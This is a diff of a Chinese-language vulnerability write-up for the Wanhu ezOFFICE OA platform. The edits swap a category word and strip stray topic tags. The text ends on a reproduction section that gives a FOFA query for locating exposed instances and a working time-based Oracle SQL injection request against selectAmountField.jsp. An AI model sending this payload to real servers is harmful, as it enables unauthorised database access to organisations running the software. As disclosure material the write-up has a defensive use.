@@ -8,7 +8,7 @@ asset_dir: embedded-base64
 
 万户OA [ezoffice](https://mrxn.net/tag/ezoffice "ezoffice") 是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公[软件](#)产品，统一的基础管理平台，实现用户[数据](#)统一管理、权限统一分配、身份统一认证。统一规划门户网站群和协同办公平台，将外网信息维护、客户服务、互动交流和日常工作紧密结合起来，有效提高工作效率。
 
-工厂自动化
+商业服务
 
 # 0x02 漏洞概述
 
@@ -19,14 +19,6 @@ asset_dir: embedded-base64
 本地环境 OR FOFA：app="[ezOFFICE](https://mrxn.net/tag/ezOFFICE "标签：ezOFFICE")协同管理平台" || app="万户ezOFFICE协同管理平台" || app="万户网络-ezOFFICE"
 
 # 漏洞复现
-
-深入探索
-
-脚本语言
-
-计算机科学
-
-防病毒程序与恶意软件
 
 ```
 GET /defaultroot/platform/custom/custom_database/dropdownselect/selectAmountField.jsp;.js?tableId=1+and+1=dbms_pipe.receive_message('RDS',5)-- HTTP/1.1
